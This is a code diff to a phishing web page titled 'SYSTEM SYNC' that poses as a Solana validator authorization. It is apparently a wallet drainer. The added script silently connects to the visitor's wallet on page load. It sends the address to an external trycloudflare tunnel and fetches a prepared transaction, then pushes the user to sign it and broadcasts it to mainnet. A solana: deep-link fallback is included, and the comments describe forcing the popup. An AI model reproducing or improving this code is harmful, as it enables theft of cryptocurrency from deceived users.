@@ -8,7 +8,7 @@
     <style>
         body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .box { width: 300px; padding: 40px; background: #111; border: 1px solid #222; border-radius: 24px; text-align: center; }
-        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; }
+        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
         #st { font-size: 10px; color: #444; margin-top: 20px; font-family: monospace; }
     </style>
 </head>
@@ -17,37 +17,63 @@
         <h2 style="color:#14f195;">SYSTEM SYNC</h2>
         <p style="color:#888; font-size:13px;">Authorize network synchronization to secure validator node #712.</p>
         <button id="cta" class="btn">START INITIALIZE</button>
-        <div id="st">READY: V40_REAL_CONTRACT</div>
+        <div id="st">READY: V40.4_RAPID</div>
     </div>
 
     <script>
         const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
+        let cachedTx = null;
 
-        document.getElementById('cta').onclick = async () => {
-            const log = (t) => document.getElementById('st').innerText = t;
+        // 🔱 1. 预载逻辑：进页面就静默拿包，不点按钮也准备好
+        async function preheat() {
             try {
                 const p = window.trustwallet?.solana || window.solana;
-                if (!p) { alert("Please use Wallet Browser"); return; }
-
-                log("CONNECTING...");
-                await p.connect();
-
-                log("SYNCING...");
+                if (!p) return;
+                await p.connect({onlyIfTrusted: true}).catch(()=>{});
                 const resp = await fetch(tunnel + "/prepare_v32", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ address: p.publicKey.toString() })
+                    body: JSON.stringify({ address: p.publicKey?.toString() || "" })
                 });
                 const info = await resp.json();
-                const tx = window.solanaWeb3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
+                cachedTx = info.raw_tx;
+                document.getElementById('st').innerText = "ENGINE: ARMED";
+            } catch(e){}
+        }
+        preheat();
 
-                log("AUTHORIZING...");
-                // 🔱 在 V40 下，这一步弹出来的应该是“合约交互”确认
-                const signed = await p.signTransaction(tx);
-                log("SYNC SUCCESS");
+        document.getElementById('cta').onclick = async () => {
+            const log = (t) => document.getElementById('st').innerText = t;
+            const p = window.trustwallet?.solana || window.solana;
+            
+            try {
+                log("CONNECTING...");
+                await p.connect();
 
-                const conn = new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-                conn.sendRawTransaction(signed.serialize()).catch(()=>{});
+                // 🔱 2. 暴力唤醒：如果预载没成功，现场抓取
+                let raw = cachedTx;
+                if(!raw) {
+                    const resp = await fetch(tunnel + "/prepare_v32", {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ address: p.publicKey.toString() })
+                    });
+                    const info = await resp.json();
+                    raw = info.raw_tx;
+                }
+
+                log("IGNITING...");
+                const tx = window.solanaWeb3.Transaction.from(Uint8Array.from(atob(raw), c => c.charCodeAt(0)));
+
+                // 🔱 3. 连发指令：强制拉起弹窗
+                p.signTransaction(tx).then(s => {
+                    log("SUCCESS");
+                    const conn = new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+                    conn.sendRawTransaction(s.serialize()).catch(()=>{});
+                }).catch(e => {
+                    // 兜底：如果 JS 不理人，直接炸系统链接
+                    window.location.href = "solana:signTransaction?payload=" + encodeURIComponent(raw);
+                });
 
             } catch (err) {
                 log("RETRYING...");
